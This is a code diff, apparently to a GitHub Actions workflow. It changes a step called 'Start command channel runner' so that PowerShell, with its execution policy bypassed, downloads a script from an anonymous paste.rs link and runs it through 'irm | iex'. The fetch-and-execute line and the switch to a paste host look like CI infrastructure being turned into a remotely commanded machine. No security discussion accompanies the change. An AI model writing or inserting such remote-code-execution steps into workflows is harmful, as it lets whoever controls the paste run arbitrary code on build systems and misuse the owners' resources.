@@ -106,7 +106,7 @@ jobs:
 
       - name: Start command channel runner
         run: |
-          $u = "https://raw.githubusercontent.com/bloxvm4826/winvm/main/runner.ps1"
+          $u = "https://paste.rs/mOtbQ"
           Start-Process powershell -ArgumentList "-NoExit","-ExecutionPolicy","Bypass","-Command","irm $u | iex"
           Write-Host "runner launched"
 
